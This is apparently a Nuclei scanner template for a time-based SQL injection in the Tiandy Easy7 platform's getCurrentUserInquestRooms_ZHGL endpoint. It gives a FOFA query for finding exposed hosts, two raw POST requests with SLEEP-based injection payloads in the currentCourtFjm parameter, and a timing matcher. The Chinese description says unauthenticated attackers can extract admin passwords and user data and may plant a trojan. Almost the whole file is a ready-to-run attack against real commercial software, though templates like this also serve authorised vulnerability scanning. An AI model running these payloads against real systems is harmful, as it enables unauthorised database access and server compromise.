id: TianDiWeiYe-Easy7-getCurrentUserInquestRooms_ZHGL-SQL-Time

info:
  name: 天地伟业Easy7 /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL SQL延时注入
  author: HuanXiong
  severity: high
  description: |
    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
    天地伟业Easy7 /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL 接口存在SQL延时注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql-time, tiandy, easy7


http:
  - raw:
      - |-
        POST /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
        Accept-Encoding: gzip
        Connection: keep-alive
        Content-Length: 81
        Content-Type: application/x-www-form-urlencoded

        currentCourtFjm=1' AND (SELECT 6954 FROM (SELECT(SLEEP(4)))wPUM) AND 'onSs'='onSs

      - |-
        POST /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
        Accept-Encoding: gzip
        Connection: keep-alive
        Content-Length: 81
        Content-Type: application/x-www-form-urlencoded

        currentCourtFjm=1' AND (SELECT 6954 FROM (SELECT(SLEEP(8)))wPUM) AND 'onSs'='onSs

    matchers:
      - type: dsl
        name: SQL延时注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"